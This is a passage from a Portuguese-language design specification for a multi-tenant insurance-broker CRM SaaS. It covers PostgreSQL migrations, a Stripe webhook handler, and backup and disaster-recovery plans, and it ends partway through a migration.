  company_id UUID REFERENCES companies(id) NOT NULL UNIQUE,
  plan_id UUID REFERENCES plans(id) NOT NULL,
  
  status VARCHAR(50), -- 'trial', 'active', 'past_due', 'suspended', 'cancelled'
  trial_ends_at TIMESTAMP, -- Para planos trial
  
  -- Informações de pagamento (gateway)
  gateway_name VARCHAR(50), -- 'stripe', 'paypal', 'manual'
  gateway_customer_id VARCHAR(255),
  gateway_subscription_id VARCHAR(255),
  
  current_period_start DATE NOT NULL,
  current_period_end DATE NOT NULL,
  next_billing_date DATE,
  
  auto_renew BOOLEAN DEFAULT TRUE,
  cancelled_at TIMESTAMP,
  suspension_reason VARCHAR(255),
  
  criado_em TIMESTAMP DEFAULT NOW(),
  atualizado_em TIMESTAMP DEFAULT NOW()
);

-- Invoices (faturas)
CREATE TABLE invoices (
  id UUID PRIMARY KEY,
  company_id UUID REFERENCES companies(id) NOT NULL,
  subscription_id UUID REFERENCES subscriptions(id),
  
  numero_nf VARCHAR(50) UNIQUE, -- SEQ-2026-00001
  status VARCHAR(50), -- 'draft', 'sent', 'paid', 'overdue', 'cancelled'
  
  moeda VARCHAR(3) DEFAULT 'USD',
  valor_total DECIMAL(15, 2) NOT NULL,
  valor_imposto DECIMAL(15, 2) DEFAULT 0,
  valor_desconto DECIMAL(15, 2) DEFAULT 0,
  
  period_start DATE NOT NULL,
  period_end DATE NOT NULL,
  
  data_emissao DATE NOT NULL,
  data_vencimento DATE NOT NULL,
  data_pagamento DATE,
  
  gateway_invoice_id VARCHAR(255), -- Stripe invoice ID
  
  criado_em TIMESTAMP DEFAULT NOW(),
  atualizado_em TIMESTAMP DEFAULT NOW()
);

-- Payment Attempts (histórico de tentativas de cobrança)
CREATE TABLE payment_attempts (
  id UUID PRIMARY KEY,
  invoice_id UUID REFERENCES invoices(id) NOT NULL,
  
  status VARCHAR(50), -- 'pending', 'success', 'failed'
  motivo_falha VARCHAR(255),
  
  gateway_attempt_id VARCHAR(255),
  
  tentativa_numero INT DEFAULT 1,
  proxima_tentativa DATE, -- Retry automático
  
  criado_em TIMESTAMP DEFAULT NOW()
);

-- Webhook Events (auditoria de eventos do gateway)
CREATE TABLE webhook_events (
  id UUID PRIMARY KEY,
  gateway_event_id VARCHAR(255) UNIQUE NOT NULL,
  gateway_name VARCHAR(50) NOT NULL,
  event_type VARCHAR(100), -- 'charge.success', 'charge.failed', etc
  
  processado BOOLEAN DEFAULT FALSE,
  processado_em TIMESTAMP,
  
  payload JSONB NOT NULL, -- Raw event
  
  criado_em TIMESTAMP DEFAULT NOW()
);
```

### 9.2 Webhook Seguro (Stripe, por exemplo)
```javascript
app.post('/webhooks/stripe', express.raw({type: 'application/json'}), async (req, res) => {
  const sig = req.headers['stripe-signature'];
  const event = stripe.webhooks.constructEvent(
    req.body,
    sig,
    process.env.STRIPE_WEBHOOK_SECRET
  );
  
  // 1. Verificar assinatura (stripe.webhooks.constructEvent já faz)
  // 2. Gravar evento em webhook_events (para auditoria + retry)
  const webookRecord = await db.insert(webhookEventsTable).values({
    gateway_event_id: event.id,
    gateway_name: 'stripe',
    event_type: event.type,
    payload: event.data.object
  });
  
  // 3. Idempotência: se evento já foi processado, skip
  const existingEvent = await db.select()
    .from(webhookEventsTable)
    .where(eq(webhookEventsTable.gateway_event_id, event.id));
  
  if (existingEvent?.processado) {
    return res.json({ received: true }); // ACK sem processar novamente
  }
  
  // 4. Processar conforme tipo
  switch (event.type) {
    case 'charge.succeeded':
      const subscription = await db.select()
        .from(subscriptionsTable)
        .where(eq(subscriptionsTable.gateway_subscription_id, event.data.object.subscription));
      
      await db.update(subscriptionsTable)
        .set({
          status: 'active',
          atualizado_em: new Date()
        })
        .where(eq(subscriptionsTable.id, subscription.id));
      
      await logAudit({
        userId: null, // Sistema
        companyId: subscription.company_id,
        acao: 'PAYMENT_RECEIVED',
        recurso_tipo: 'invoice',
        detalhes: { stripe_event_id: event.id }
      });
      break;
    
    case 'charge.failed':
      // Agendar retry automático
      const failedSubscription = await db.select()
        .from(subscriptionsTable)
        .where(eq(subscriptionsTable.gateway_subscription_id, event.data.object.subscription));
      
      await db.update(subscriptionsTable)
        .set({
          status: 'past_due',
          atualizado_em: new Date()
        })
        .where(eq(subscriptionsTable.id, failedSubscription.id));
      
      // Enviar email ao admin da empresa
      await sendEmail(failedSubscription.company_id, 'Payment failed, please update payment method');
      break;
    
    // ... outros eventos
  }
  
  // 5. Marcar como processado
  await db.update(webhookEventsTable)
    .set({
      processado: true,
      processado_em: new Date()
    })
    .where(eq(webhookEventsTable.id, webookRecord.id));
  
  res.json({ received: true });
});
```

---

## 10. BACKUP E DISASTER RECOVERY

### 10.1 Estratégia
```
RPO (Recovery Point Objective): 1 hora
RTO (Recovery Time Objective): 4 horas

Banco de Dados PostgreSQL:
- Backup automático a cada hora (PITR — Point-in-Time Recovery)
- Retenção: 30 dias
- Local: AWS S3 (versioning habilitado)
- Teste de restore: semanal (em staging)

Storage (Documentos):
- Versionamento habilitado no S3
- Retenção: 90 dias de versões antigas
- Replicação cross-region: ativada
- Teste de restore: mensal

Aplicação:
- Container no ECR (versionado por git commit)
- Rollback: redeploy da versão anterior de container
```

### 10.2 Backup PostgreSQL (AWS RDS)
```
Se usar RDS (recomendado):
- Automated Backups: 30 dias
- Multi-AZ: habilitado (replica síncrona)
- Enhanced Monitoring: habilitado
- PITR: 35 dias

Teste de restauração (antes de ir para produção):
1. Agendar restore para staging
2. Rodar script de validação:
   SELECT COUNT(*) FROM companies; -- Esperado: N
   SELECT COUNT(*) FROM audit_logs; -- Esperado: M
3. Testar operação: login, criar cliente, etc.
4. Destruir banco de teste
```

### 10.3 Backup de Storage (S3)
```
Cross-Region Replication (CRR):
- Source: us-east-1 (pipenexo-docs)
- Destination: eu-west-1 (pipenexo-docs-backup)
- Replicação automática, 15 minutos

Versionamento:
- Lifecycle Policy: mover versões antigas para Glacier após 90 dias
- Retenção legal: 7 anos para certos tipos de documento
```

### 10.4 Procedimento de Restauração
```
Cenário: Banco de dados corrompido em produção

1. Alertar: Oncall recebe notificação
2. Avaliar: Verificar RDS event logs
3. Preparar staging: Restaurar último backup em staging
4. Validar: Correr testes de integridade
5. Decidir: Restaurar para production ou usar replica (multi-AZ)
6. Executar: Failover para replica (< 2 minutos) ou restaurar backup (15-30 min)
7. Testar: Operação básica no novo banco
8. Documentar: Post-mortem
```

---

## 11. SCHEMA DE BANCO DE DADOS COMPLETO (SQL)

**NOTA**: Todas as tabelas usam `company_id` obrigatório (exceto plataforma + super_admin)

### 11.1 Migrations na Sequência Correta

**Migration 001: Plataforma — Empresas e Planos**
```sql
CREATE EXTENSION IF NOT EXISTS "uuid-ossp";

-- Planos (dados, não código)
CREATE TABLE plans (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  nome VARCHAR(100) NOT NULL UNIQUE,
  descricao TEXT,
  max_users INT NOT NULL DEFAULT 5,
  max_api_calls_per_month BIGINT NOT NULL DEFAULT 100000,
  max_storage_mb BIGINT NOT NULL DEFAULT 5000,
  preco_usd_monthly DECIMAL(10, 2) NOT NULL,
  features TEXT[] DEFAULT '{}',
  ativo BOOLEAN NOT NULL DEFAULT TRUE,
  criado_em TIMESTAMP NOT NULL DEFAULT NOW(),
  atualizado_em TIMESTAMP NOT NULL DEFAULT NOW()
);

-- Empresas clientes do PipeNexo
CREATE TABLE companies (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  
  razao_social VARCHAR(255) NOT NULL,
  nome_fantasia VARCHAR(255),
  cnpj VARCHAR(14) UNIQUE,
  
  email VARCHAR(255),
  telefone VARCHAR(20),
  responsavel_nome VARCHAR(255),
  
  plan_id UUID NOT NULL REFERENCES plans(id),
  status VARCHAR(50) NOT NULL DEFAULT 'trial', -- 'trial', 'active', 'past_due', 'suspended', 'cancelled'
  max_users INT NOT NULL DEFAULT 5,
  
  trial_ends_at TIMESTAMP,
  subscription_started_at TIMESTAMP,
  subscription_due_at TIMESTAMP,
  
  logo_url VARCHAR(512),
  
  deleted_at TIMESTAMP,
  
  criado_em TIMESTAMP NOT NULL DEFAULT NOW(),
  atualizado_em TIMESTAMP NOT NULL DEFAULT NOW()
);

CREATE INDEX companies_status ON companies(status) WHERE deleted_at IS NULL;
CREATE INDEX companies_trial_ends ON companies(trial_ends_at) WHERE deleted_at IS NULL AND status = 'trial';

-- Subscriptions (empresa ↔ plano ↔ pagamento)
CREATE TABLE subscriptions (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  company_id UUID NOT NULL UNIQUE REFERENCES companies(id) ON DELETE CASCADE,
  plan_id UUID NOT NULL REFERENCES plans(id),
  
  status VARCHAR(50) NOT NULL DEFAULT 'trial',
  
  gateway_name VARCHAR(50), -- 'stripe', 'paypal', etc
  gateway_customer_id VARCHAR(255),
  gateway_subscription_id VARCHAR(255),
  
  current_period_start DATE NOT NULL,
  current_period_end DATE NOT NULL,
  next_billing_date DATE,
  
  auto_renew BOOLEAN NOT NULL DEFAULT TRUE,
  cancelled_at TIMESTAMP,
  suspension_reason VARCHAR(255),
  
  criado_em TIMESTAMP NOT NULL DEFAULT NOW(),
  atualizado_em TIMESTAMP NOT NULL DEFAULT NOW()
);

CREATE INDEX subscriptions_status ON subscriptions(status);
CREATE INDEX subscriptions_gateway ON subscriptions(gateway_name, gateway_subscription_id);

-- Habilitação de features por empresa
CREATE TABLE company_features (
  company_id UUID NOT NULL REFERENCES companies(id) ON DELETE CASCADE,
  feature_key VARCHAR(100) NOT NULL,
  habilitado BOOLEAN NOT NULL DEFAULT TRUE,
  
  PRIMARY KEY (company_id, feature_key)
);

-- Logs de auditoria (IMUTÁVEL)
CREATE TABLE audit_logs (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  company_id UUID REFERENCES companies(id) ON DELETE SET NULL,
  user_id UUID, -- Referência será adicionada na migration seguinte
  
  acao VARCHAR(50) NOT NULL, -- 'CREATE', 'UPDATE', 'DELETE', 'LOGIN', 'LOGOUT', 'EXPORT', etc
  recurso_tipo VARCHAR(50), -- 'client', 'deal', 'policy', etc
  recurso_id VARCHAR(100),
  
  valor_antes JSONB,
  valor_depois JSONB,
  
  ip_address VARCHAR(45),
  user_agent VARCHAR(512),
  
  criado_em TIMESTAMP NOT NULL DEFAULT NOW()
);

CREATE INDEX audit_logs_company_created ON audit_logs(company_id, criado_em DESC);
CREATE INDEX audit_logs_user_created ON audit_logs(user_id, criado_em DESC) WHERE user_id IS NOT NULL;
CREATE INDEX audit_logs_acao ON audit_logs(acao, criado_em DESC);

-- Invoices (faturas/cobranças)
CREATE TABLE invoices (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  company_id UUID NOT NULL REFERENCES companies(id) ON DELETE CASCADE,
  subscription_id UUID REFERENCES subscriptions(id) ON DELETE SET NULL,
  
  numero_nf VARCHAR(50) UNIQUE,
  status VARCHAR(50) NOT NULL DEFAULT 'draft', -- 'draft', 'sent', 'paid', 'overdue', 'cancelled'
  
  moeda VARCHAR(3) NOT NULL DEFAULT 'USD',
  valor_total DECIMAL(15, 2) NOT NULL,
  valor_imposto DECIMAL(15, 2) DEFAULT 0,
  valor_desconto DECIMAL(15, 2) DEFAULT 0,
  
  period_start DATE NOT NULL,
  period_end DATE NOT NULL,
  
  data_emissao DATE NOT NULL,
  data_vencimento DATE NOT NULL,
  data_pagamento DATE,
  
  gateway_invoice_id VARCHAR(255),
  
  criado_em TIMESTAMP NOT NULL DEFAULT NOW(),
  atualizado_em TIMESTAMP NOT NULL DEFAULT NOW()
);

CREATE INDEX invoices_company_status ON invoices(company_id, status);
CREATE INDEX invoices_vencimento ON invoices(data_vencimento) WHERE status IN ('draft', 'sent', 'overdue');

-- Webhook Events (auditoria de eventos de gateway)
CREATE TABLE webhook_events (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  gateway_event_id VARCHAR(255) UNIQUE NOT NULL,
  gateway_name VARCHAR(50) NOT NULL,
  event_type VARCHAR(100),
  
  processado BOOLEAN NOT NULL DEFAULT FALSE,
  processado_em TIMESTAMP,
  
  payload JSONB NOT NULL,
  
  criado_em TIMESTAMP NOT NULL DEFAULT NOW()
);

CREATE INDEX webhook_events_idempotence ON webhook_events(gateway_event_id);
CREATE INDEX webhook_events_processado ON webhook_events(processado);
```

**Migration 002: Usuários, Roles, Permissões**
```sql
-- Roles (papéis)
CREATE TABLE roles (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  company_id UUID REFERENCES companies(id) ON DELETE CASCADE, -- NULL = super_admin global
  
  nome VARCHAR(100) NOT NULL,
  descricao TEXT,
  
  criado_em TIMESTAMP NOT NULL DEFAULT NOW(),
  
  UNIQUE(company_id, nome)
);

-- Permissões (granulares)
CREATE TABLE permissions (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  chave VARCHAR(100) NOT NULL UNIQUE,
  descricao TEXT,
  modulo VARCHAR(50), -- 'crm', 'financeiro', 'saude', 'sinistros', etc
  
  criado_em TIMESTAMP NOT NULL DEFAULT NOW()
);

-- Associação role ↔ permissions
CREATE TABLE role_permissions (
  role_id UUID NOT NULL REFERENCES roles(id) ON DELETE CASCADE,
  permission_id UUID NOT NULL REFERENCES permissions(id) ON DELETE CASCADE,
  
  PRIMARY KEY (role_id, permission_id)
);

-- Usuários
CREATE TABLE users (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  company_id UUID REFERENCES companies(id) ON DELETE CASCADE, -- NULL apenas para super_admin
  
  nome VARCHAR(255) NOT NULL,
  email VARCHAR(255) NOT NULL UNIQUE,
  email_verificado BOOLEAN DEFAULT FALSE,
  email_verificado_em TIMESTAMP,
  
  senha_hash VARCHAR(255) NOT NULL, -- Bcrypt com 10+ rounds
  
  role VARCHAR(50) NOT NULL DEFAULT 'user', -- 'super_admin', 'company_admin', 'manager', 'user', 'atendente'
  status VARCHAR(50) NOT NULL DEFAULT 'active', -- 'active', 'inactive', 'suspended'
  
  ultimo_login TIMESTAMP,
  ultimo_login_ip VARCHAR(45),
  
  deleted_at TIMESTAMP,
  
  criado_em TIMESTAMP NOT NULL DEFAULT NOW(),
  atualizado_em TIMESTAMP NOT NULL DEFAULT NOW()
);

CREATE INDEX users_company_status ON users(company_id, status) WHERE deleted_at IS NULL;
CREATE INDEX users_email ON users(email) WHERE deleted_at IS NULL;

-- Override de permissões por usuário
CREATE TABLE user_permissions (
  user_id UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  permission_id UUID NOT NULL REFERENCES permissions(id) ON DELETE CASCADE,
  concedida BOOLEAN NOT NULL DEFAULT TRUE, -- true = permite, false = nega (override de role)
  
  PRIMARY KEY (user_id, permission_id)
);

-- Equipes (organização dentro de uma empresa)
CREATE TABLE teams (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  company_id UUID NOT NULL REFERENCES companies(id) ON DELETE CASCADE,
  
  nome VARCHAR(100) NOT NULL,
  descricao TEXT,
  setor VARCHAR(100),
  
  criado_em TIMESTAMP NOT NULL DEFAULT NOW(),
  atualizado_em TIMESTAMP NOT NULL DEFAULT NOW(),
  
  UNIQUE(company_id, nome)
);

-- Membros de equipe
CREATE TABLE team_members (
  team_id UUID NOT NULL REFERENCES teams(id) ON DELETE CASCADE,
  user_id UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  
  PRIMARY KEY (team_id, user_id)
);

-- Sessões (tokens, devices)
CREATE TABLE sessions (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  company_id UUID NOT NULL REFERENCES companies(id) ON DELETE CASCADE,
  user_id UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  
  refresh_token_hash VARCHAR(64) NOT NULL UNIQUE, -- SHA-256 hex
  refresh_token_family VARCHAR(64), -- Detectar reutilização
  
  device_name VARCHAR(255),
  device_ip VARCHAR(45) NOT NULL,
  device_user_agent VARCHAR(512),
  
  criado_em TIMESTAMP NOT NULL DEFAULT NOW(),
  atualizado_em TIMESTAMP NOT NULL DEFAULT NOW(),
  expires_at TIMESTAMP NOT NULL,
  revogado_em TIMESTAMP
);

CREATE INDEX sessions_refresh_token ON sessions(refresh_token_hash);
CREATE INDEX sessions_user_expires ON sessions(user_id, expires_at) WHERE revogado_em IS NULL;

-- Password Resets
CREATE TABLE password_resets (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  
  token_hash VARCHAR(64) NOT NULL UNIQUE, -- SHA-256 hex
  used_at TIMESTAMP,
  
  expires_at TIMESTAMP NOT NULL,
  criado_em TIMESTAMP NOT NULL DEFAULT NOW()
);

CREATE INDEX password_resets_expires ON password_resets(expires_at) WHERE used_at IS NULL;
```

**Migration 003: CRM — Clientes, Pipelines, Negócios**
```sql
-- Clientes
CREATE TABLE clients (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  company_id UUID NOT NULL REFERENCES companies(id) ON DELETE CASCADE,
  
  nome VARCHAR(255) NOT NULL,
  tipo VARCHAR(20) NOT NULL DEFAULT 'pf', -- 'pf' (pessoa física), 'pj' (jurídica)
  
  cpf_cnpj VARCHAR(20),
  email VARCHAR(255),
  telefone VARCHAR(20),
  whatsapp VARCHAR(20),
  
  endereco_rua VARCHAR(255),
  endereco_numero VARCHAR(20),
  endereco_complemento VARCHAR(255),
  endereco_cidade VARCHAR(100),
  endereco_estado VARCHAR(2),
  endereco_cep VARCHAR(8),
  
  origem VARCHAR(100), -- Referência a origens_clientes
  origem_indicador_id UUID REFERENCES clients(id) ON DELETE SET NULL, -- Se origem = "Indicação"
  
  responsavel_id UUID REFERENCES users(id) ON DELETE SET NULL,
  produtor_id UUID REFERENCES users(id) ON DELETE SET NULL,
  
  tags TEXT[] DEFAULT '{}',
  
  data_primeiro_contato DATE,
  data_ultimo_contato DATE,
  
  deleted_at TIMESTAMP,
  deleted_by UUID REFERENCES users(id) ON DELETE SET NULL,
  
  criado_em TIMESTAMP NOT NULL DEFAULT NOW(),
  atualizado_em TIMESTAMP NOT NULL DEFAULT NOW()
);

CREATE INDEX clients_company_nome ON clients(company_id, nome) WHERE deleted_at IS NULL;
CREATE INDEX clients_responsavel ON clients(company_id, responsavel_id) WHERE deleted_at IS NULL;
CREATE INDEX clients_origin ON clients(company_id, origem) WHERE deleted_at IS NULL;

-- Origens de clientes (configurável por empresa)
CREATE TABLE origens_clientes (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  company_id UUID NOT NULL REFERENCES companies(id) ON DELETE CASCADE,
  
  nome VARCHAR(100) NOT NULL,
  descricao TEXT,
  ativo BOOLEAN NOT NULL DEFAULT TRUE,
  
  criado_em TIMESTAMP NOT NULL DEFAULT NOW(),
  
  UNIQUE(company_id, nome)
);

-- Pipelines (funis de vendas)
CREATE TABLE pipelines (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  company_id UUID NOT NULL REFERENCES companies(id) ON DELETE CASCADE,
  
  nome VARCHAR(100) NOT NULL,
  descricao TEXT,
  setor VARCHAR(100),
  
  automacao_ganho_pipeline_id UUID REFERENCES pipelines(id) ON DELETE SET NULL,
  
  deleted_at TIMESTAMP,
  
  criado_em TIMESTAMP NOT NULL DEFAULT NOW(),
  atualizado_em TIMESTAMP NOT NULL DEFAULT NOW(),
  
  UNIQUE(company_id, nome)
);

-- Etapas de pipeline
CREATE TABLE pipeline_stages (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  pipeline_id UUID NOT NULL REFERENCES pipelines(id) ON DELETE CASCADE,
  
  nome VARCHAR(100) NOT NULL,
  ordem INT NOT NULL,
  cor_hex VARCHAR(7),
  
  criado_em TIMESTAMP NOT NULL DEFAULT NOW(),
  
  UNIQUE(pipeline_id, nome)
);

-- Negócios/Deals
CREATE TABLE deals (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  company_id UUID NOT NULL REFERENCES companies(id) ON DELETE CASCADE,
  client_id UUID NOT NULL REFERENCES clients(id) ON DELETE CASCADE,
  pipeline_id UUID NOT NULL REFERENCES pipelines(id) ON DELETE CASCADE,
  stage_id UUID NOT NULL REFERENCES pipeline_stages(id) ON DELETE CASCADE,
  
  titulo VARCHAR(255) NOT NULL,
  descricao TEXT,
  
  valor DECIMAL(15, 2),
  moeda VARCHAR(3) DEFAULT 'BRL',
  
  responsavel_id UUID REFERENCES users(id) ON DELETE SET NULL,
  
  data_fechamento_prevista DATE,
  status VARCHAR(50) NOT NULL DEFAULT 'aberto', -- 'aberto', 'ganho', 'perdido', 'congelado'
  
  motivo_perda VARCHAR(255),
  data_perda DATE,
  
  deleted_at TIMESTAMP,
  deleted_by UUID REFERENCES users(id) ON DELETE SET NULL,
  
  criado_em TIMESTAMP NOT NULL DEFAULT NOW(),
  atualizado_em TIMESTAMP NOT NULL DEFAULT NOW()
);

CREATE INDEX deals_company_client ON deals(company_id, client_id) WHERE deleted_at IS NULL;
CREATE INDEX deals_pipeline_stage ON deals(pipeline_id, stage_id) WHERE deleted_at IS NULL;
CREATE INDEX deals_responsavel ON deals(company_id, responsavel_id) WHERE deleted_at IS NULL;
CREATE INDEX deals_status ON deals(company_id, status) WHERE deleted_at IS NULL;
```

**Migration 004: Apólices, Produtos, Comissões**
```sql
-- Produtos
CREATE TABLE products (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  company_id UUID NOT NULL REFERENCES companies(id) ON DELETE CASCADE,
  
  nome VARCHAR(255) NOT NULL,
  ramo VARCHAR(100), -- 'auto', 'vida', 'saúde', 'residencial', 'empresarial', 'fiança'
  seguradora VARCHAR(100),
  
  descricao TEXT,
  comissao_percentual DECIMAL(5, 2),
  
  repasse_tipo VARCHAR(20), -- 'percentual', 'fixo'
  repasse_valor DECIMAL(10, 2),
  
  formas_pagamento TEXT[],
  campos_exigidos JSONB, -- JSON Schema dos campos obrigatórios
  documentos_necessarios TEXT[],
  
  ativo BOOLEAN NOT NULL DEFAULT TRUE,
  
  deleted_at TIMESTAMP,
  
  criado_em TIMESTAMP NOT NULL DEFAULT NOW(),
  atualizado_em TIMESTAMP NOT NULL DEFAULT NOW(),
  
  UNIQUE(company_id, nome, ramo, seguradora)
);

-- Apólices
CREATE TABLE policies (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  company_id UUID NOT NULL REFERENCES companies(id) ON DELETE CASCADE,
  client_id UUID NOT NULL REFERENCES clients(id) ON DELETE CASCADE,
  deal_id UUID REFERENCES deals(id) ON DELETE SET NULL,
  product_id UUID REFERENCES products(id) ON DELETE SET NULL,
  
  numero_apolice VARCHAR(50),
  ramo VARCHAR(100),
  seguradora VARCHAR(100),
  
  valor_premio DECIMAL(15, 2),
  moeda VARCHAR(3) DEFAULT 'BRL',
  
  vigencia_inicio DATE NOT NULL,
  vigencia_fim DATE NOT NULL,
  
  status VARCHAR(50) NOT NULL DEFAULT 'ativa', -- 'ativa', 'renovacao', 'vencida', 'cancelada'
  
  forma_pagamento VARCHAR(50),
  num_parcelas INT,
  
  responsavel_id UUID REFERENCES users(id) ON DELETE SET NULL,
  
  deleted_at TIMESTAMP,
  deleted_by UUID REFERENCES users(id) ON DELETE SET NULL,
  
  criado_em TIMESTAMP NOT NULL DEFAULT NOW(),
  atualizado_em TIMESTAMP NOT NULL DEFAULT NOW(),
  
  UNIQUE(company_id, numero_apolice)
);

CREATE INDEX policies_company_client ON policies(company_id, client_id) WHERE deleted_at IS NULL;
CREATE INDEX policies_vigencia ON policies(company_id, vigencia_fim) WHERE deleted_at IS NULL AND status = 'ativa';
CREATE INDEX policies_status ON policies(company_id, status) WHERE deleted_at IS NULL;

-- Comissões (geradas automaticamente quando apólice é criada)
CREATE TABLE commissions (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  company_id UUID NOT NULL REFERENCES companies(id) ON DELETE CASCADE,
  deal_id UUID REFERENCES deals(id) ON DELETE SET NULL,
  policy_id UUID REFERENCES policies(id) ON DELETE CASCADE,
  
  usuario_id UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  
  seguradora VARCHAR(100),
  ramo VARCHAR(100),
  
  valor_premio DECIMAL(15, 2),
  percentual_comissao DECIMAL(5, 2),
  valor_comissao DECIMAL(15, 2),
  
  status_comissao VARCHAR(50) DEFAULT 'prevista', -- 'prevista', 'recebida', 'paga'
  data_recebimento DATE,
  
  deleted_at TIMESTAMP,
  
  criado_em TIMESTAMP NOT NULL DEFAULT NOW(),
  atualizado_em TIMESTAMP NOT NULL DEFAULT NOW()
);

CREATE INDEX commissions_company_usuario ON commissions(company_id, usuario_id) WHERE deleted_at IS NULL;
CREATE INDEX commissions_status ON commissions(company_id, status_comissao) WHERE deleted_at IS NULL;
```

**Migration 005: Tarefas, Timeline, Documentos**
```sql
-- Tarefas
CREATE TABLE tasks (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  company_id UUID NOT NULL REFERENCES companies(id) ON DELETE CASCADE,
  
  titulo VARCHAR(255) NOT NULL,
  descricao TEXT,
  
  client_id UUID REFERENCES clients(id) ON DELETE CASCADE,
  deal_id UUID REFERENCES deals(id) ON DELETE CASCADE,
  policy_id UUID REFERENCES policies(id) ON DELETE CASCADE,
  
  responsavel_id UUID REFERENCES users(id) ON DELETE SET NULL,
  
  data_vencimento DATE,
  hora_vencimento TIME,
  duracao_minutos INT,
  
  prioridade VARCHAR(50) DEFAULT 'normal', -- 'baixa', 'normal', 'alta', 'urgente'
  status VARCHAR(50) NOT NULL DEFAULT 'aberto', -- 'aberto', 'em_progresso', 'concluido', 'cancelado'
  
  tipo VARCHAR(50) DEFAULT 'tarefa', -- 'tarefa', 'ligacao', 'reuniao', 'retorno', 'visita'
  
  lembrete_minutos INT, -- 0, 15, 60, 1440
  
  recorrencia VARCHAR(20), -- 'nenhuma', 'diaria', 'semanal', 'mensal'
  recorrencia_ate DATE,
  
  deleted_at TIMESTAMP,
  deleted_by UUID REFERENCES users(id) ON DELETE SET NULL,
  
  criado_em TIMESTAMP NOT NULL DEFAULT NOW(),
  atualizado_em TIMESTAMP NOT NULL DEFAULT NOW()
);

CREATE INDEX tasks_company_responsavel ON tasks(company_id, responsavel_id) WHERE deleted_at IS NULL AND status != 'concluido';
CREATE INDEX tasks_vencimento ON tasks(company_id, data_vencimento) WHERE deleted_at IS NULL;

-- Timeline (histórico unificado)
CREATE TABLE timeline_events (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  company_id UUID NOT NULL REFERENCES companies(id) ON DELETE CASCADE,
  user_id UUID REFERENCES users(id) ON DELETE SET NULL,
  
  recurso_tipo VARCHAR(50) NOT NULL, -- 'client', 'deal', 'policy', 'task', 'claim', etc
  recurso_id UUID NOT NULL,
  
  evento_tipo VARCHAR(100) NOT NULL, -- 'criado', 'mudou_stage', 'ganho', 'perdido', 'renovacao_criada', etc
  
  valor_anterior JSONB,
  valor_novo JSONB,
  descricao TEXT,
  
  criado_em TIMESTAMP NOT NULL DEFAULT NOW()
);

CREATE INDEX timeline_recurso ON timeline_events(company_id, recurso_tipo, recurso_id, criado_em DESC);
CREATE INDEX timeline_usuario ON timeline_events(company_id, user_id, criado_em DESC);

-- Documentos
CREATE TABLE documents (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  company_id UUID NOT NULL REFERENCES companies(id) ON DELETE CASCADE,
  
  recurso_tipo VARCHAR(50) NOT NULL, -- 'client', 'deal', 'policy', 'claim', etc
  recurso_id UUID NOT NULL,
  
  nome_original VARCHAR(255) NOT NULL,
  nome_seguro VARCHAR(255) NOT NULL UNIQUE,
  mime_type VARCHAR(50) NOT NULL,
  tamanho_bytes BIGINT NOT NULL,
  
  storage_key VARCHAR(1024) NOT NULL, -- s3://pipenexo-docs/company-{id}/...
  
  carregado_por UUID NOT NULL REFERENCES users(id) ON DELETE SET NULL,
  carregado_em TIMESTAMP NOT NULL DEFAULT NOW(),
  
  hash_md5 VARCHAR(32),
  scan_malware_status VARCHAR(20) DEFAULT 'pending', -- 'pending', 'clean', 'infected'
  scan_malware_timestamp TIMESTAMP,
  
  deleted_at TIMESTAMP,
  deleted_by UUID REFERENCES users(id) ON DELETE SET NULL,
  
  criado_em TIMESTAMP NOT NULL DEFAULT NOW(),
  atualizado_em TIMESTAMP NOT NULL DEFAULT NOW()
);

CREATE INDEX documents_recurso ON documents(company_id, recurso_tipo, recurso_id) WHERE deleted_at IS NULL;
CREATE INDEX documents_storage ON documents(storage_key);
CREATE INDEX documents_scan ON documents(scan_malware_status) WHERE deleted_at IS NULL;

-- Anotações
CREATE TABLE notes (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  company_id UUID NOT NULL REFERENCES companies(id) ON DELETE CASCADE,
  
  recurso_tipo VARCHAR(50) NOT NULL, -- 'client', 'deal', etc
  recurso_id UUID NOT NULL,
  
  conteudo TEXT NOT NULL,
  
  autor_id UUID NOT NULL REFERENCES users(id) ON DELETE SET NULL,
  
  editado_por UUID REFERENCES users(id) ON DELETE SET NULL,
  editado_em TIMESTAMP,
  
  deleted_at TIMESTAMP,
  deleted_by UUID REFERENCES users(id) ON DELETE SET NULL,
  
  criado_em TIMESTAMP NOT NULL DEFAULT NOW(),
  atualizado_em TIMESTAMP NOT NULL DEFAULT NOW()
);

CREATE INDEX notes_recurso ON notes(company_id, recurso_tipo, recurso_id) WHERE deleted_at IS NULL;
```

**Migration 006: Saúde, Sinistros, Renovações**
```sql
-- Requisições de Saúde
CREATE TABLE health_requests (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  company_id UUID NOT NULL REFERENCES companies(id) ON DELETE CASCADE,
  
  numero_protocolo VARCHAR(50) UNIQUE,
